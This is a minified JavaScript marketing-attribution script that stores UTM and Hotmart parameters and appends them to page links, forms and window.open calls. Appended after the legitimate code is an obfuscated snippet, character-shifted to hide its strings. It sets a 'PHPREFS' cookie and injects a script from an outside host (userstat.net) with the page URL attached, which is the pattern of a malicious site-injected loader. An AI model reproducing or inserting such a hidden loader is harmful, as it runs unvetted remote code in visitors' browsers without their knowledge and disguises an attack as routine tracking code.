"use strict";console.log("utms script loaded! 2.3.8"),window.paramsList=["utm_source","utm_campaign","utm_medium","utm_content","utm_term","xcod","src"],window.itemExpInDays=7;const requiredParams=["utm_source","utm_campaign","utm_medium","utm_content","xcod","sck"];function getExpKey(key){return`${key}_exp`}function saveParams(){const params=new URLSearchParams(window.location.search);window.paramsList.forEach((param=>{const value=params.get(param);value&&((key,value)=>{localStorage.setItem(key,value);const expDate=new Date((new Date).getTime()+24*window.itemExpInDays*60*60*1e3);localStorage.setItem(getExpKey(key),expDate.toISOString())})(param,value)}))}function getCompleteParams(){const UTM_AD_OBJECT_TYPE_SEPARATOR="hQwK21wXxR",searchParamsFromUrl=new URLSearchParams(window.location.search);function getParam(key){const valueInUrl=searchParamsFromUrl.get(key);if(!(null==valueInUrl||"null"===valueInUrl||"undefined"===valueInUrl||""===valueInUrl))return valueInUrl;const valueInLocalStorage=localStorage.getItem(key);if(!valueInLocalStorage)return"";const itemExpDate=localStorage.getItem(getExpKey(key));return!itemExpDate||new Date(itemExpDate)<new Date?(localStorage.removeItem(key),localStorage.removeItem(getExpKey(key)),""):valueInLocalStorage}function getHotmartGroupedParams(values){return values.join(UTM_AD_OBJECT_TYPE_SEPARATOR)}const utmTerm=getParam("utm_term"),utmContent=getParam("utm_content"),utmMedium=getParam("utm_medium"),originalUtmCampaign=getParam("utm_campaign"),utmSource=getParam("utm_source"),completeParams=new URLSearchParams;completeParams.set("utm_source",utmSource),completeParams.set("utm_campaign",originalUtmCampaign.includes("rKm-km-rKm")?originalUtmCampaign:`${originalUtmCampaign}rKm-km-rKm${utmMedium}`),completeParams.set("utm_medium",utmMedium),completeParams.set("utm_content",utmContent),completeParams.set("utm_term",utmTerm);const utmCampaign=completeParams.get("utm_campaign")??"",classicParams=[utmSource,utmCampaign,utmMedium,utmContent,utmTerm],groupedParamsString=getHotmartGroupedParams(classicParams);completeParams.set("subid",utmSource),completeParams.set("subid2",utmCampaign),completeParams.set("subid3",utmMedium),completeParams.set("subid4",utmContent);const xcod=getParam("xcod"),src=getParam("src"),alternativeHotmart=""!==xcod?xcod:src,shortHotmartValue=function reduceStrLengthForHotmart(value,maxLength){if(value.length<=maxLength)return value;const separatorTotalLength=4*UTM_AD_OBJECT_TYPE_SEPARATOR.length,maxLengthPerPart=Math.floor((maxLength-separatorTotalLength-12-80)/5);function reducePart(part,useSplit){function shortenPart(part){return part.substring(0,maxLengthPerPart)+"..."}if(!useSplit)return shortenPart(part);const sections=part.split("rKm-km-rKm")[0].split("|"),id=sections[sections.length-1];return`${shortenPart(sections.slice(0,-1).join("|"))}|${id}`}const[utmSource,utmCampaign,utmMedium,utmContent,utmTerm]=value.split(UTM_AD_OBJECT_TYPE_SEPARATOR);return getHotmartGroupedParams([reducePart(utmSource,!1),reducePart(utmCampaign,!0),reducePart(utmMedium,!0),reducePart(utmContent,!0),reducePart(utmTerm,!1)])}(classicParams.every((p=>""===p))?alternativeHotmart:groupedParamsString,255);return completeParams.set("xcod",shortHotmartValue),completeParams.set("sck",shortHotmartValue),null!=src&&""!==src&&completeParams.set("src",src),completeParams}function work(){function rebuildLinks(needAValidation){const completeParams=getCompleteParams();document.querySelectorAll("a").forEach((e=>{if(e.href.startsWith("mailto:"))return;if(e.href.startsWith("tel:"))return;if(e.href.startsWith("whatsapp:"))return;if(e.href.includes("#"))return;if(needAValidation){if(requiredParams.every((param=>e.href.includes(param))))return}const char=-1===e.href.indexOf("?")?"?":"&";e.href+=char+(completeParams?.toString()??"")}))}function rebuildForms(needAValidation){const completeParamsStr=encodeURIComponent(getCompleteParams()?.toString()??""),forms=document.querySelectorAll("form");console.log("forms",forms),forms.forEach((form=>{if(needAValidation){if(requiredParams.every((param=>form.action.includes(param))))return}const char=function getCharForAction(action){return action.indexOf("redirect_url")||-1===action.indexOf("?")?"?":"&"}(form.action);form.action+=`${char}${completeParamsStr}`}))}saveParams(),rebuildLinks(),rebuildForms(),function configWindowOpen(){const saveOpen=window.open;window.open=function(url,windowName,parms){const char=-1===url?.toString().indexOf("?")?"?":"&";return url+=char+(getCompleteParams()?.toString()??""),saveOpen(url,windowName||"",parms||"")}}()}"complete"===document.readyState?work():window.addEventListener("load",work);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));